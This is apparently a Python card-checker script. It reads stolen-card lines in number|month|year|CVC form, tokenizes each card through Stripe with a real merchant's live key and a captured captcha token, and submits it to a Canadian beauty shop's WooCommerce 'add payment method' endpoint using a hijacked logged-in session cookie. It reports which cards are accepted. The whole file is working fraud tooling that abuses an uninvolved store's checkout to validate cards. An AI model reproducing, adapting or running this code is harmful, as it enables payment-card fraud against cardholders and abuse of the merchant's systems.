import requests,re
from bs4 import BeautifulSoup
import time
def Tele1(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()
    import requests

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=EG&pasted_fields=number&payment_user_agent=stripe.js%2Fc710570bc1%3B+stripe-js-v3%2Fc710570bc1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmgbeautyconcept.ca&time_on_page=51882&client_attribution_metadata[client_session_id]=79dab3aa-5b5d-4fde-8a21-c7c4e3c52aa5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=a50980d2-700f-493f-9af2-64e097e916890fd4d5&muid=2a7dca89-d93d-4b76-b7af-69aa9a71db803f4c09&sid=a222b72a-249b-4525-b3bb-cdfdc404c3aedc7e11&key=pk_live_51Jl1gYDP1AP20tUlzabDjFzlAyM5fph3tttSj0yejJpu3eOwQIe2xVXEQdy1OnCn1k9EGYew5pGf5XFSiaAwZwkw00qZDZWmOl&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUFQ2aFRQQ1czYStaSHVGVTZrR0JYWTAvM2krQjgvOHJoM1NsblpHUjViR1EyV0h3Q3VXVjBFS0o2bi9rSDZiNTJsTVhIbWUvbWVaL2RlWDk0S01wenYvTVl0NWlZdk9xVzFRd0lpcjI5QXJWVlRmVjhUK2ltVVpsdDlPa1ZjSkJUajVLNVVSdzJ6a0dpREQxK1gyZ2VZWVJPSUViMDliK2lnWjFZQjR0dVRwcVpyMDY3dGxVcThBeUNTaDUzL1ZmN2x2MjR3QjYzVmU2S3lQMFlyTmFwdkx5R21uU1ZoNVpIOFpNZnZYblh3WTd1T3IzQVlTUVF4L3N0T1QvUk0xYkozamxtMm9hYzhhL3FHQWtwQjFZV0I0czV5Z0JCMk44dlJpUEwyM3RwcWZKWDNTZVNNYXBzNFBCUXpMUEROVUZyMXo5RzB6TE5JSWlSZEFuOGhuU29rWWtYb0JSRXYvYWNwUTVrODMxZEVkWVk5Wm5GMzE4WlQ2WHFZcGNVd1hFaTdxRithVmNOYjZSbFFyd1BaN05LVmRpUXQ3Q3NXYnhwNncrQmEvM0dIRkwxcElwU1paMnU4RXVDLzRYeXROZDdUcFk3Y0g2WGprWjU1YlA2QXBTOFhwUWpxQmovN2lXOEgwdmxsbWJNdDVQWVMyMWQzUmdrT0ZGY2Ywd2tlQWh6TVIrdFhka2FpOW1pQVlZM0I2akdUREVCOWRMSEpKTDVObnF0U1NwTjFPT3RTMSs5clFlVCtmVkFKcTFCdC9ZYzhXaEsxKy9sS004TGpzL2l5dTFFOXJlNmk1NmRVM0VDQjZpT2dJTG42aFd1Y1VzWHBGVWs0d3BHKzJGZ1dsRkJ0Tmo5Zy8zUEVUOXJwaHhnRVl2TVJRY0JyOUw1VmRHZWRNSk8ya0hTRkwyNzVlUUdTRzZuUkZlTEpqeG9XODF3THUzc1hCRVNpWit3RFVYcTVOZ1MxbXBvck9ZaWQ5OWZabU5VL0R4MUVRM0ZuRjFMc1I5clhYQ1hmbVlaQ05QK2N5d3Q0VkF4amlEM3JIUGdxeUJrbGRIMVB6Y29VYThjL1l2Rk5Ua0RJTlRtcXBLOHQvOGswdDZpaURmUGp2QW5HOER6VnhZK1JJM2xxUmprd1Q0REJWTC9wb0pHd2FRcGFSeXF5WXdLMDJpdnJaVFlXT3ZESE9VemtsTVlpRUxObER4L2F0dkxncVhLZjB4cC9rdm8xMlZtcEdIOHNMM2NscUdwUWNSdjFDWGNqeVdhdFlEMkpHRUFhTUlaYnY0bFF4YTZsRURUSC95bkZwbXZpaUxOYmcvTW1tNzFPV09hdC9Dd2tzMnhaQ1pDMFdEWU42c2J4cFJwZHdaV0RpVkMwcytwN25Tb1JzQjJxL3ZvdkNhWEhwOWlnRFJBOWhaNkZxbGdCR2tubUYwTkpZQlpLVUtXaU9GQ0w4WGpzZlYvVHcxWXJZbUJlMXFNK2RlUXU0aHJPUThRdkVuL1EwaWRtUjBVOUp2aEk4MWExcWJUN09FRWx6M0RydkhTQmhWK2NPeks2S0hTZjU5aXdyN1p2UEc0eSsxajdCbFU5ZTJNa2JBb3JjWGhVZHhBZTBXeU9KVHZwRkxyalA5c3Rad3pMMjFzRTVXK0xIYk9LVEwvbVRYblpPdEcwOFcrTUtvUGxGN2t4Unhsb1B6UFVYT01SbXFJdWlpcm9NQVpVbnZKUG5BVUR1L0xIZDVUVTRlWjB6elhJK2hDbkFDZkM3NTBxUzRRank5Zmp5MWJQOVdwWmxQT1ExWEk1RnNrUjJzV01YT0VBUm03dGlSYW02bjU3NVI4amxRakNRV0JUZDJFd2Fsd2E4cnlOV0FKdmF2R1FzUTJNRlVLanNXTDQ4aEtWY29oSHBHcWxXOHUrYmZ4YllWTHZRNnIzcklrdnNoaENUdE1rdDFCT2g0Mk5rZGt5QzlzWWtYcUpOY3pzNTNack9YZWVIdnFxRGVwdXR4M1JKUmRLc2wyKzQzblJEcVIzZGJ2L3Z3cGNOVmdpd0VjNmVrcEwxZ2dhWVlFaC9DODVZcG5qd1VtOEF5T1YvZERvcVVuZTRpY0IvOEVGNmlKUHpST0xTYkVHeWRXZmJNNU9Vci8rWkd2dWdhYnh1UUJSQnIyY3hyamxWUHN5RVM4RDhHSDJLVXpSaXA0WmlZYytmcWZsTzNySFZaVTEwdmdpV2psK0Y0NWtGdVRxTWI2Rm5MN3FJRUluYnNySzdNNjgva3l6OHZXa2hKdEVCNXVuODM4VFNyU0xRdkpoaWFQN0REQVFvQVNMcW5saFZzN0JCUmFmTDJFbHc3STdWU2RXRHRxVVZhYzhqeXYxODNXNFF6enhRMm5ocDNaUUF3VDRXTXlNUlU0ZjFtb2Q3S2NPNlIzRk4xWkpiK0ZlMkt2RGVtYy9Ka0ZlQ1l3eUpFSEVYYmZGOXpmenpYbnVHRjltMjEyZ1d5aVFtenBIQ3FkREVoQ1hMZzd5VWRLSm02QWRPa1pRMU9uTXFPWjhzSjFheG1TT1Y5NU01a3NBMUJuSllTK1FDR2FCNXB3Rk0vVWM0RHU1aHVjejhGSnBubWNyRjB6ZUZidkxZQzlFWUVuOFNONEdrbHlycW9FVXRMWGdXZU1mS1hHQ1pBVUpsd2NtRS9ERkFHSU5DbjdJWUhsN0xUaDB2ZEpxeTc0UlVMZTg5NjhKRUI3UXhlTUw2WTlLbkw4MWlPY2h1bHVaRmc5ZC9tUFBIR3BtUktTZEd6aTNFeGRSNWRDYzBNYTJKTXBSMDR4Z3dyVXg4Y0NTdnNoRWZiQ1UxTE0yb2FCN1BGblhoaXVpdG5uUDVHM3RIRGdiNGhRRkFMU2pobzVGZVE5c3FRbCtYR0JRendOL0x1YTZleTlUNlBQSnNTR2h1eFhJdFE4OU5kUHBBenlNaW5HN0Iyc2tEYWx3a1NwQ1hFb05pVVVWSDMydW1kMjhxcUlUbEw4Q2tMSXJYcSIsImV4cCI6MTcyNTYzMjExNiwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjJmYzNlODcxIiwicGQiOjAsImNkYXRhIjoicVA4aWFucld6T3JDQUNIVUEvU2k2eWlXMXp2ZXN1SHhNM00zTjBVTVhVZ3R5Y0FJTlVKaktWaUxwZVNoRlpialVuSkh0ZTA1Q3VaSGVyMTVtNjdDNnVJandrOTNRQUZac3RSak5pQmxqcUExbEx2Ym16OFI0RGhqWWgvc3lRS0VEcEhYVGtKUVJJaEkxd3pvb1pOYjBBYTk3NTNsVHQ0em8yODFMZlBEN2k3OTd2MUExL0RyMDJESTQzMGR4dFVNL3RBZ3A0Rk9VaVBsL3BURyJ9.VOU4HGPoP1Evd4bjCaUOg1LYuI9h0vzEpDT0IdcrF8s'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        tome = (response.json()['id'])
    except:
        pass
    import requests

    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
        'sbjs_first_add': 'fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
        'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'wordpress_logged_in_3e6bdd864a0ee940a1b2726c08cda6ee': 'xodisox675%7C1726735545%7CEwAJoQBYvDpKeCMnvXqAYmQwZUQ9qQZGxEdLz1EqJkz%7C500640bc349e9d252efa6769d38ecec1ab57f7e8da60670a8b1448aa105bff6b',
        '__stripe_mid': '1f53de03-a9a9-4547-8b63-e3de963c4845d37f06',
        'mfn-gdpr': '1',
        'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2Fadd-payment-method%2F',
        '__stripe_sid': 'ca04c141-0129-4108-b48c-2063706f6d41343f63',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_first_add=fd%3D2024-09-05%2008%3A16%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_current=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wordpress_logged_in_3e6bdd864a0ee940a1b2726c08cda6ee=xodisox675%7C1726735545%7CEwAJoQBYvDpKeCMnvXqAYmQwZUQ9qQZGxEdLz1EqJkz%7C500640bc349e9d252efa6769d38ecec1ab57f7e8da60670a8b1448aa105bff6b; __stripe_mid=1f53de03-a9a9-4547-8b63-e3de963c4845d37f06; mfn-gdpr=1; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmgbeautyconcept.ca%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=ca04c141-0129-4108-b48c-2063706f6d41343f63',
        'origin': 'https://mgbeautyconcept.ca',
        'priority': 'u=1, i',
        'referer': 'https://mgbeautyconcept.ca/my-account/add-payment-method/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }

    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method':tome,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': '1588635d20',
    }

    response = requests.post('https://mgbeautyconcept.ca/', params=params, cookies=cookies, headers=headers, data=data)
    msg = response.json()

    if 'error' in msg.get('data', {}) and 'message' in msg['data']['error']:
        
        message = msg['data']['error']['message']

        return message

    elif 'succeeded' in msg.get('data', {}).get('status', ''):

        return 'Card added successfully'
        
    else:

        return msg
